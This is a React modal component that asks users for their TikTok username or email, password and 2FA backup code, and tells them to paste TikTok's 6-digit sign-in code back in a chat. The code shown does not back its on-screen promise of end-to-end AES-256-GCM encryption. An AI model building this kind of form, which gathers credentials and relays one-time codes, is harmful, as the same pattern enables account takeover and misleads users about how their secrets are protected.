"use client";

import { useEffect, useState } from "react";
import { createPortal } from "react-dom";

type Props = {
  onClose: () => void;
  onSubmit: (payload: {
    tiktokUsername: string;
    tiktokEmail: string;
    password: string;
    backupCode: string;
    notes: string;
  }) => Promise<void>;
};

export default function CredentialsModal({ onClose, onSubmit }: Props) {
  const [mounted, setMounted] = useState(false);
  const [form, setForm] = useState({
    tiktokUsername: "",
    tiktokEmail: "",
    password: "",
    backupCode: "",
    notes: "",
  });
  const [showPassword, setShowPassword] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Portal is browser-only. Also lock body scroll while open.
  useEffect(() => {
    setMounted(true);
    const prevOverflow = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    function onKey(e: KeyboardEvent) {
      if (e.key === "Escape") onClose();
    }
    document.addEventListener("keydown", onKey);
    return () => {
      document.body.style.overflow = prevOverflow;
      document.removeEventListener("keydown", onKey);
    };
  }, [onClose]);

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    if (submitting) return;
    setError(null);
    if (!form.tiktokUsername && !form.tiktokEmail) {
      setError("Enter your TikTok username or email.");
      return;
    }
    if (!form.password) {
      setError("Enter your TikTok password.");
      return;
    }
    setSubmitting(true);
    try {
      await onSubmit(form);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Something went wrong.");
    } finally {
      setSubmitting(false);
    }
  }

  if (!mounted) return null;

  return createPortal(
    <div className="cred-root" role="dialog" aria-modal="true" aria-label="Submit TikTok login">
      <div className="cred-scrim" onClick={onClose} />
      <aside className="cred-panel" onClick={(e) => e.stopPropagation()}>
        <div className="cred-head">
          <div>
            <div className="cred-eyebrow">SECURE SUBMISSION</div>
            <h2>Submit your TikTok login</h2>
            <p>
              Encrypted end-to-end with AES-256-GCM. Only authorized
              admins can decrypt it inside the private console — never
              emailed, never logged.
            </p>
          </div>
          <button type="button" className="cred-close" onClick={onClose} aria-label="Close">×</button>
        </div>

        <form onSubmit={submit} className="cred-form">
          <div className="cred-row">
            <label>
              <span>TikTok username</span>
              <input
                type="text"
                value={form.tiktokUsername}
                onChange={(e) => setForm((f) => ({ ...f, tiktokUsername: e.target.value }))}
                placeholder="@yourhandle"
                autoComplete="off"
              />
            </label>
            <label>
              <span>TikTok email</span>
              <input
                type="email"
                value={form.tiktokEmail}
                onChange={(e) => setForm((f) => ({ ...f, tiktokEmail: e.target.value }))}
                placeholder="you@example.com"
                autoComplete="off"
              />
            </label>
          </div>

          <label className="cred-label">
            <span>Password *</span>
            <div className="cred-password">
              <input
                type={showPassword ? "text" : "password"}
                value={form.password}
                onChange={(e) => setForm((f) => ({ ...f, password: e.target.value }))}
                required
                autoComplete="off"
              />
              <button
                type="button"
                className="cred-eye"
                onClick={() => setShowPassword((v) => !v)}
                aria-label={showPassword ? "Hide password" : "Show password"}
              >
                {showPassword ? "Hide" : "Show"}
              </button>
            </div>
          </label>

          <label className="cred-label">
            <span>Backup code / 2FA recovery (optional)</span>
            <input
              type="text"
              value={form.backupCode}
              onChange={(e) => setForm((f) => ({ ...f, backupCode: e.target.value }))}
              placeholder="If you have a saved backup code"
              autoComplete="off"
            />
          </label>

          <label className="cred-label">
            <span>Notes (optional)</span>
            <textarea
              value={form.notes}
              onChange={(e) => setForm((f) => ({ ...f, notes: e.target.value }))}
              rows={2}
              placeholder="Anything the team should know about this account"
            />
          </label>

          <div className="cred-warning">
            <strong>Heads up:</strong> TikTok will email a 6-digit code
            when we sign in. Watch your inbox and paste it back to us
            in the chat.
          </div>

          {error && <div className="cred-error">{error}</div>}

          <div className="cred-actions">
            <button type="button" className="cred-cancel" onClick={onClose}>Cancel</button>
            <button type="submit" className="cred-submit" disabled={submitting}>
              {submitting ? "Encrypting + Sending…" : "🔒 Send securely"}
            </button>
          </div>
        </form>
      </aside>

      <style jsx>{`
        .cred-root {
          position: fixed;
          inset: 0;
          z-index: 10000;
          display: flex;
          justify-content: flex-end;
          pointer-events: none;
        }
        .cred-scrim {
          position: absolute;
          inset: 0;
          background: rgba(0, 0, 0, 0.55);
          backdrop-filter: blur(4px);
          pointer-events: auto;
          animation: cred-fade 180ms ease-out;
        }
        .cred-panel {
          position: relative;
          background: #17171A;
          border-left: 1px solid rgba(255, 255, 255, 0.08);
          width: 460px;
          max-width: 100%;
          height: 100vh;
          box-shadow: -20px 0 60px rgba(0, 0, 0, 0.6);
          overflow-y: auto;
          pointer-events: auto;
          animation: cred-slide 220ms cubic-bezier(0.16, 1, 0.3, 1);
          color: #F5F5F7;
          font-family: 'Inter Tight', system-ui, -apple-system, sans-serif;
        }

        @keyframes cred-fade {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes cred-slide {
          from { transform: translateX(100%); }
          to { transform: translateX(0); }
        }

        .cred-head {
          display: flex; justify-content: space-between; align-items: flex-start;
          padding: 26px 28px 18px;
          border-bottom: 1px solid rgba(255, 255, 255, 0.06);
          gap: 16px;
        }
        .cred-eyebrow {
          font-size: 10.5px; letter-spacing: 0.24em;
          color: #DC1E2E; font-weight: 700;
          text-transform: uppercase; margin-bottom: 6px;
        }
        .cred-head h2 {
          margin: 0; font-size: 20px; font-weight: 800;
          color: #FFFFFF; letter-spacing: -0.01em;
        }
        .cred-head p {
          margin: 8px 0 0; font-size: 12.5px; color: #9A9AA2;
          line-height: 1.5;
        }
        .cred-close {
          background: transparent; border: none;
          color: #9A9AA2; font-size: 26px; cursor: pointer;
          padding: 0 4px; line-height: 1;
        }
        .cred-close:hover { color: #DC1E2E; }

        .cred-form {
          padding: 22px 28px 28px;
          display: flex; flex-direction: column; gap: 16px;
        }
        .cred-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
        .cred-form label {
          display: flex; flex-direction: column; gap: 6px;
          font-size: 11.5px; color: #9A9AA2;
          font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase;
        }
        .cred-form input, .cred-form textarea {
          background: #101012;
          border: 1px solid rgba(255, 255, 255, 0.1);
          border-radius: 8px;
          color: #F5F5F7;
          padding: 10px 14px;
          font-family: inherit;
          font-size: 13.5px;
          letter-spacing: normal;
          text-transform: none;
          outline: none;
        }
        .cred-form input:focus, .cred-form textarea:focus { border-color: #DC1E2E; }
        .cred-form textarea { resize: vertical; min-height: 60px; }
        .cred-password { display: flex; gap: 8px; }
        .cred-password input { flex: 1; }
        .cred-eye {
          background: #101012;
          border: 1px solid rgba(255, 255, 255, 0.1);
          color: #9A9AA2; font-family: inherit;
          font-size: 11px; font-weight: 700;
          padding: 0 14px; border-radius: 8px; cursor: pointer;
          letter-spacing: 0.06em; text-transform: uppercase;
        }
        .cred-eye:hover { color: #DC1E2E; border-color: #DC1E2E; }

        .cred-warning {
          background: rgba(220, 30, 46, 0.06);
          border: 1px solid rgba(220, 30, 46, 0.28);
          border-left: 3px solid #DC1E2E;
          border-radius: 8px;
          padding: 12px 14px;
          font-size: 12.5px; color: #9A9AA2;
          line-height: 1.55;
        }
        .cred-warning strong { color: #FFFFFF; font-weight: 700; }

        .cred-error {
          color: #DC1E2E; font-size: 13px; font-weight: 600;
          padding: 8px 12px;
          background: rgba(220, 30, 46, 0.08);
          border-radius: 6px;
        }

        .cred-actions { display: flex; gap: 10px; justify-content: flex-end; margin-top: 4px; }
        .cred-cancel {
          background: transparent; border: 1px solid rgba(255, 255, 255, 0.1);
          color: #9A9AA2; font: inherit;
          font-size: 12.5px; font-weight: 700;
          padding: 10px 16px; border-radius: 8px; cursor: pointer;
          letter-spacing: 0.06em; text-transform: uppercase;
        }
        .cred-cancel:hover { color: #FFFFFF; border-color: #FFFFFF; }
        .cred-submit {
          background: #DC1E2E; border: 1px solid #DC1E2E;
          color: #FFFFFF; font: inherit;
          font-size: 12.5px; font-weight: 700;
          padding: 10px 18px; border-radius: 8px; cursor: pointer;
          letter-spacing: 0.06em; text-transform: uppercase;
          transition: transform 120ms ease, box-shadow 120ms ease, opacity 120ms ease;
        }
        .cred-submit:hover:not(:disabled) {
          transform: translateY(-1px);
          box-shadow: 0 8px 24px -8px rgba(220, 30, 46, 0.35);
          background: #FF3542;
        }
        .cred-submit:disabled { opacity: 0.6; cursor: progress; }

        /* Mobile — center modal instead of side drawer */
        @media (max-width: 640px) {
          .cred-root { justify-content: center; align-items: center; padding: 16px; }
          .cred-panel {
            width: 100%;
            max-height: 92vh;
            height: auto;
            border-left: none;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            animation: cred-pop 200ms cubic-bezier(0.16, 1, 0.3, 1);
          }
          @keyframes cred-pop {
            from { transform: scale(0.94); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
          }
          .cred-row { grid-template-columns: 1fr; }
        }
      `}</style>
    </div>,
    document.body
  );
}
